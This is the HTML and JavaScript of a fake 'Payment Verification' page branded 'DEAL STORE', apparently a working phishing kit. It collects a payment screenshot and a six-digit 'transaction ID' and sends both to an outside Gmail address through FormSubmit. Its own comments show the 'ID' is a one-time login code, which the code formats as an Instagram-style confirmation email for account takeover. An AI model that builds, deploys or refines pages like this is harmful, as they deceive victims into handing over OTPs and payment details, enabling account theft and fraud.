<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DEAL STORE</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;min-height:100vh;margin:0;padding:15px}
.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:95%;max-width:380px;text-align:center}
.uc{width:70px;height:70px;background:linear-gradient(#ffb700,#ff8c00);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:24px;margin:0 auto 12px;border:3px solid #000}
label{display:block;text-align:left;font-weight:bold;margin:12px 0 5px;font-size:13px}
input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px;box-sizing:border-box}
.file-box{border:2px dashed #f7b500;border-radius:10px;padding:12px;margin:8px 0;background:#fffbe6}
.btn{width:100%;margin-top:12px;padding:16px;background:#f7b500;border:2px solid #000;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer}
.step{display:none} .step.active{display:block}
.preview{width:100%;max-height:120px;display:none;margin-top:5px;border-radius:8px}
.loader{display:none;margin-top:15px}
.spinner{width:45px;height:45px;border:4px solid #f3f3f3;border-top:4px solid #f7b500;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.success{background:#e8f5e9;border:1px solid #4caf50;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold;display:none}
</style>
</head>
<body>

<div class="box step active" id="step1">
<div class="uc">UC</div>
<h2>Payment Verification</h2>
<label>Amount</label>
<input type="number" id="amount" value="1500">
<label>Screenshot</label>
<div class="file-box">
<input type="file" id="ss" accept="image/*" onchange="document.getElementById('p1').style.display='block'; document.getElementById('p1').src=URL.createObjectURL(this.files[0])">
<img id="p1" class="preview">
</div>
<button class="btn" id="verifyBtn" onclick="verifyAndGo()">VERIFY TO CHECK →</button>
<div id="loader" class="loader"><div class="spinner"></div><p>Verifying...</p></div>
</div>

<div class="box step" id="step2">
<div class="uc">UC</div>
<h2>Transaction ID</h2>
<input id="txn" type="tel" placeholder="160443" style="font-size:45px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:90px">
<div id="ok2" class="success"></div>
<div style="display:flex;gap:8px;margin-top:12px">
<button class="btn" style="background:#fff;flex:1" onclick="goBack()">← BACK</button>
<button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">SUBMIT ID</button>
</div>
</div>

<script>
function verifyAndGo(){
 let amount=document.getElementById('amount').value;
 let file=document.getElementById('ss').files[0];
 if(!amount){alert('Amount likho');return;}
 if(!file){alert('Screenshot lagao');return;}
 document.getElementById('verifyBtn').style.display='none';
 document.getElementById('loader').style.display='block';
 let fd=new FormData();
 fd.append('_subject', `SCREENSHOT - Rs ${amount}`);
 fd.append('_captcha','false');
 fd.append('Amount',amount);
 fd.append('Screenshot',file);
 fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
 setTimeout(()=>{
  document.getElementById('step1').classList.remove('active');
  document.getElementById('step2').classList.add('active');
  document.getElementById('loader').style.display='none';
  document.getElementById('verifyBtn').style.display='block';
 },2500);
}
function goBack(){
 document.getElementById('step2').classList.remove('active');
 document.getElementById('step1').classList.add('active');
}
async function sendTxn(){
 let id=document.getElementById('txn').value.trim();
 let amount=document.getElementById('amount').value;
 if(id.length<6){alert('Transaction ID likho');return;}
 let btn=document.getElementById('btn2');
 btn.innerText='Sending...';

 // Instagram jaisa OTP boxes banate hain
 let boxes = id.split('').map(d=>`<span style="display:inline-block;background:#e9e9e9;border-radius:10px;padding:14px 18px;margin:5px;font-size:48px;font-weight:900;color:#000;min-width:20px;text-align:center">${d}</span>`).join('');

 let htmlEmail = `
 <div style="font-family:Arial,sans-serif;max-width:500px;margin:0 auto;background:#fff;padding:20px">
   <h2 style="font-size:22px;color:#000;margin-bottom:15px">Your email confirmation code</h2>
   <p style="color:#666;font-size:14px">Code requested</p>
   <div style="margin:20px 0">
     ${boxes}
   </div>
   <div style="background:#2d2d2d;color:#fff;display:inline-block;padding:12px 25px;border-radius:25px;font-weight:bold;margin-top:10px">Copy code: ${id}</div>
   <hr style="margin:30px 0;border:1px solid #eee">
   <p style="font-size:16px"><b>Transaction_ID:</b> ${id}</p>
   <p style="font-size:16px"><b>Amount:</b> ${amount}</p>
   <p style="font-size:13px;color:#888">Submitted at ${new Date().toString()}</p>
 </div>
 `;

 let fd=new FormData();
 fd.append('_subject', `Your email confirmation code - ${id}`);
 fd.append('_captcha','false');
 fd.append('_template','table');
 fd.append('Transaction_Code', id);
 fd.append('Amount', amount);
 fd.append('OTP_HTML', htmlEmail);
 // FormSubmit HTML bhejne ke liye message field me HTML
 fd.append('message', htmlEmail);
 
 await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
 
 document.getElementById('ok2').style.display='block';
 document.getElementById('ok2').innerText=`✅ ${id} OTP style me bhej diya!`;
 btn.innerText='SUBMIT ID - Phir se';
}
</script>
</body>
 </html>
